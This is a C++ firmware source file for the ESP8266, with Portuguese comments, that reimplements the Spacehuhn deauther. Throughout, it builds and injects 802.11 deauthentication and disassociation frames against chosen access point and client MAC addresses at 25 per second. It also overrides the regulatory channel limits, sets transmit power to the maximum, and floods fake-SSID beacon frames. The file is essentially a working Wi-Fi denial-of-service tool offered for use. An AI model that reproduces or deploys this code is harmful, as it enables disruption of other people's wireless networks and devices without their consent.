/*
 * Deauth: Attack::deauthDevice + Attack::sendPacket (esp8266_deauther v2 Attack.cpp / Attack.h).
 * Licenca MIT: https://github.com/SpacehuhnTech/esp8266_deauther
 */

#include "deauther.h"

#include <cstring>

#include <ESP8266WiFi.h>
#include "app_state.h"
#include "wifi_portal.h"

extern "C"
{
#include "user_interface.h"
}

bool deautherRunning = false;
unsigned long deautherPacketsSent = 0;
unsigned long deautherTmpPacketRate = 0;
unsigned long deautherInjectFail = 0;
bool beaconActive = false;
unsigned long beaconPacketsSent = 0;

static bool attackActive = false;
static uint8_t targetApMac[6];
static uint8_t targetClientMac[6];
static uint8_t targetChannel = 1;
static uint8_t attackReason = 7;
static unsigned long lastAttackPacketAt = 0;
static unsigned long lastBeaconTickAt = 0;

/** Igual a A_config.h padrao do Spacehuhn v2 (DEAUTHS_PER_TARGET 25). */
static constexpr uint8_t kDeauthsPerSecond = 25;
static constexpr unsigned long kDeauthPeriodMs =
    (kDeauthsPerSecond > 0) ? (1000UL / kDeauthsPerSecond) : 40UL;

/** Cache de canal como functions.h:setWifiChannel no Spacehuhn. */
static uint8_t s_wifiChannelCache = 255;

static void setWifiChannelSh(uint8_t ch, bool force)
{
  if ((((ch != s_wifiChannelCache) || force) && (ch < 15)) && ch >= 1)
  {
    s_wifiChannelCache = ch;
    wifi_set_channel(ch);
  }
}

/** Politica manual ampla (comum em firmwares de teste de RF no ESP8266). */
static void applyInjectionCountry()
{
  wifi_country_t c;
  memset(&c, 0, sizeof(c));
  strncpy(c.cc, "01", 3);
  c.schan = 1;
  c.nchan = 14;
  c.policy = WIFI_COUNTRY_POLICY_MANUAL;
  wifi_set_country(&c);
}

void restoreWifiRegAfterInjection()
{
  wifi_country_t c;
  memset(&c, 0, sizeof(c));
  strncpy(c.cc, "CN", 3);
  c.schan = 1;
  c.nchan = 13;
  c.policy = WIFI_COUNTRY_POLICY_AUTO;
  wifi_set_country(&c);
}

/** Attack::sendPacket — setWifiChannel + um unico wifi_send_pkt_freedom(..., 0). */
static bool sendPacketSpacehuhn(uint8_t *packet, uint16_t packetSize, uint8_t ch,
                                bool force_ch)
{
  setWifiChannelSh(ch, force_ch);
  yield();
  const bool sent = (wifi_send_pkt_freedom(packet, packetSize, 0) == 0);
  if (sent)
  {
    deautherTmpPacketRate++;
  }
  else
  {
    deautherInjectFail++;
  }
  return sent;
}

static bool macBroadcast(const uint8_t *mac)
{
  static const uint8_t bcast[6] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};
  return memcmp(mac, bcast, 6) == 0;
}

/* Template 26 bytes — Attack.h (Spacehuhn v2) member deauthPacket. */
static const uint8_t kDeauthPacket[26] = {
    /* 0 - 1 */ 0xC0, 0x00,
    /* 2 - 3 */ 0x00, 0x00,
    /* 4 - 9 */ 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,
    /* 10 - 15 */ 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,
    /* 16 - 21 */ 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,
    /* 22 - 23 */ 0x00, 0x00,
    /* 24 - 25 */ 0x01, 0x00};

/** Attack::deauthDevice (copia fiel da ordem de buffers e envios). */
static bool deauthDeviceSpacehuhn(uint8_t *apMac, uint8_t *stMac, uint8_t reason, uint8_t ch)
{
  if (!stMac)
  {
    return false;
  }

  bool success = false;
  constexpr uint16_t packetSize = 26;

  uint8_t deauthpkt[packetSize];
  memcpy(deauthpkt, kDeauthPacket, packetSize);
  memcpy(&deauthpkt[4], stMac, 6);
  memcpy(&deauthpkt[10], apMac, 6);
  memcpy(&deauthpkt[16], apMac, 6);
  deauthpkt[24] = reason;

  deauthpkt[0] = 0xc0;
  if (sendPacketSpacehuhn(deauthpkt, packetSize, ch, true))
  {
    success = true;
    deautherPacketsSent++;
  }

  uint8_t disassocpkt[packetSize];
  memcpy(disassocpkt, deauthpkt, packetSize);
  disassocpkt[0] = 0xa0;
  if (sendPacketSpacehuhn(disassocpkt, packetSize, ch, false))
  {
    success = true;
    deautherPacketsSent++;
  }

  if (!macBroadcast(stMac))
  {
    memcpy(&disassocpkt[4], apMac, 6);
    memcpy(&disassocpkt[10], stMac, 6);
    memcpy(&disassocpkt[16], stMac, 6);

    disassocpkt[0] = 0xc0;
    if (sendPacketSpacehuhn(disassocpkt, packetSize, ch, false))
    {
      success = true;
      deautherPacketsSent++;
    }

    disassocpkt[0] = 0xa0;
    if (sendPacketSpacehuhn(disassocpkt, packetSize, ch, false))
    {
      success = true;
      deautherPacketsSent++;
    }
  }

  return success;
}

/**
 * Prepara RF para injecao sem derrubar o SoftAP nem o servidor web (uso tipico com UI ativa).
 * Attack::sendPacket no v2 so muda canal; aqui mantemos AP+STA como no portal.
 */
static void prepareRadioForDeauthInjection(uint8_t channel)
{
  wifi_promiscuous_enable(0);
  WiFi.persistent(false);
  WiFi.setAutoReconnect(false);
  WiFi.setSleepMode(WIFI_NONE_SLEEP);

  WiFi.mode(WIFI_AP_STA);
  delay(50);

  wifi_set_phy_mode(PHY_MODE_11N);
  system_phy_set_max_tpw(82);

  applyInjectionCountry();

  s_wifiChannelCache = 255;
  if (channel >= 1 && channel <= 14)
  {
    wifi_set_channel(channel);
    s_wifiChannelCache = channel;
  }
  delay(50);
}

void initDeauther()
{
}

static bool parseMacString(const String &macStr, uint8_t out[6])
{
  String s = macStr;
  s.trim();
  s.replace(":", "");
  s.replace("-", "");
  s.toUpperCase();
  if (s.length() != 12)
  {
    return false;
  }
  for (int i = 0; i < 6; i++)
  {
    const String octet = s.substring(i * 2, i * 2 + 2);
    char *end = nullptr;
    const unsigned long v = strtoul(octet.c_str(), &end, 16);
    if (end == octet.c_str() || v > 255)
    {
      return false;
    }
    out[i] = static_cast<uint8_t>(v);
  }
  return true;
}

static uint8_t beaconPacket[128] = {
    0x80, 0x00, 0x00, 0x00, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x64, 0x00, 0x01, 0x04, 0x00, 0x06, 'F', 'A', 'K', 'E', 'A', 'P',
    0x01, 0x08, 0x82, 0x84, 0x8b, 0x96, 0x24, 0x30, 0x48, 0x6c, 0x03, 0x01, 0x01, 0x05, 0x04, 0x00, 0x01, 0x00, 0x00,
    0x2a, 0x01, 0x00, 0x2f, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x3d, 0x01, 0x00, 0x00, 0x4a, 0x0e, 0x01, 0x00, 0x00, 0x0f, 0xac, 0x02, 0x01, 0x00, 0x00, 0x0f, 0xac, 0x04, 0x01, 0x00, 0x00, 0x0f, 0xac, 0x02, 0x00, 0x00};

void startDeauthAttack(uint8_t *apMac, uint8_t *clientMac, uint8_t channel, uint8_t reason)
{
  deautherPacketsSent = 0;
  deautherTmpPacketRate = 0;
  deautherInjectFail = 0;

  memcpy(targetApMac, apMac, 6);
  memcpy(targetClientMac, clientMac, 6);
  targetChannel = channel;
  attackReason = reason;
  attackActive = true;
  deautherRunning = true;
  lastAttackPacketAt = millis() - kDeauthPeriodMs;

  prepareRadioForDeauthInjection(channel);
}

void stopDeauthAttack()
{
  attackActive = false;
  deautherRunning = false;

  Serial.print(F("[deauther] deauthFrames="));
  Serial.print(deautherPacketsSent);
  Serial.print(F(" tmpPacketRate="));
  Serial.print(deautherTmpPacketRate);
  Serial.print(F(" falha="));
  Serial.println(deautherInjectFail);

  restorePortalWiFiAfterDeauth();
}

void startBeaconAttack()
{
  prepareRadioForDeauthInjection(1);
  lastBeaconTickAt = millis() - kDeauthPeriodMs;
  beaconActive = true;
}

void stopBeaconAttack()
{
  beaconActive = false;
  restorePortalWiFiAfterDeauth();
}

void updateBeacon()
{
  if (beaconActive && (millis() - lastBeaconTickAt >= kDeauthPeriodMs))
  {
    for (int i = 0; i < 10; i++)
    {
      uint8_t mac[6];
      for (int j = 0; j < 6; j++)
      {
        mac[j] = random(256);
      }
      memcpy(&beaconPacket[10], mac, 6);
      memcpy(&beaconPacket[16], mac, 6);
      beaconPacket[56] = random(1, 12);

      String prefixes[5] = {"FREE", "HOTSPOT", "WIFI", "NET", "LAN"};
      String ssid = prefixes[random(5)] + String(random(9999));
      int len = ssid.length();
      if (len > 32)
      {
        len = 32;
      }
      beaconPacket[37] = static_cast<uint8_t>(len);
      for (int j = 0; j < len; j++)
      {
        beaconPacket[38 + j] = ssid[j];
      }

      setWifiChannelSh(beaconPacket[56], true);
      delay(1);
      if (wifi_send_pkt_freedom(beaconPacket, 109, 0) == 0)
      {
        deautherTmpPacketRate++;
      }
      beaconPacketsSent++;
    }
    lastBeaconTickAt = millis();
  }
}

bool isDeauthActive()
{
  return attackActive;
}

void updateDeauth()
{
  if (attackActive && (millis() - lastAttackPacketAt >= kDeauthPeriodMs))
  {
    deauthDeviceSpacehuhn(targetApMac, targetClientMac, attackReason, targetChannel);
    lastAttackPacketAt = millis();
  }
}

void toggleDeauther()
{
  if (attackActive)
  {
    stopDeauthAttack();
    Serial.println("Deauther stopped");
  }
  else
  {
    uint8_t apMac[6];
    uint8_t clientMac[6];
    if (!parseMacString(deautherApMac, apMac) || !parseMacString(deautherClientMac, clientMac))
    {
      Serial.println(F("[deauther] MAC invalido (use 12 hex, ex: aa:bb:cc:dd:ee:ff)"));
      return;
    }
    Serial.print(F("Starting deauther (Spacehuhn v2 logic) AP MAC: "));
    Serial.print(deautherApMac);
    Serial.print(F(", Client MAC: "));
    Serial.print(deautherClientMac);
    Serial.print(F(", Channel: "));
    Serial.println(deautherChannel);
    startDeauthAttack(apMac, clientMac, static_cast<uint8_t>(deautherChannel), 1);
    Serial.println("Deauther started");
  }
}
